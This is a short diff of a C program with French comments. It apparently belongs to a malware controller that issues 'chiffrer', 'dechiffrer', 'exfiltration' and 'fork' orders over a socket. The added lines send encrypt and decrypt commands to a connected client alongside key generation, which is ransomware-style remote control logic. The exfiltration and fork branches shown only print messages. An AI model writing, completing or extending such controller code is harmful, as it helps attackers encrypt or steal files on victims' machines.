@@ -128,6 +128,7 @@ int main() {
             getchar(); // Consommer le '\n' laissé par scanf
 
             if (choice == 1) {
+                send(new_socket, "chiffrer", strlen("chiffrer"), 0);
                 char key[256];
                 generate_encryption_key(key);
                 printf("Clé générée : %s\n", key);
@@ -137,6 +138,7 @@ int main() {
                 printf("Fichier chiffré avec succès.\n");
 
             } else if (choice == 2) {
+                send(new_socket, "dechiffrer", strlen("dechiffrer"), 0);
                 char key[256];
                 printf("Entrez la clé secrète : ");
                 scanf("%s", key);
@@ -145,19 +147,18 @@ int main() {
             } else {
                 printf("Choix invalide.\n");
             }
+
         } else if (strcmp(command, "exfiltration") == 0) {
             printf("Exfiltration order sent.\n");
-            
         } else if (strcmp(command, "fork") == 0) {
             printf("Fork order sent.\n");
-
         } else if (strcmp(command, "out") == 0) {
             // Fermeture de la connexion
             printf("Out order sent. Disconnecting...\n");
             break;
         }
     }
- 
+
     close(new_socket);
     close(server_fd);
     return 0;
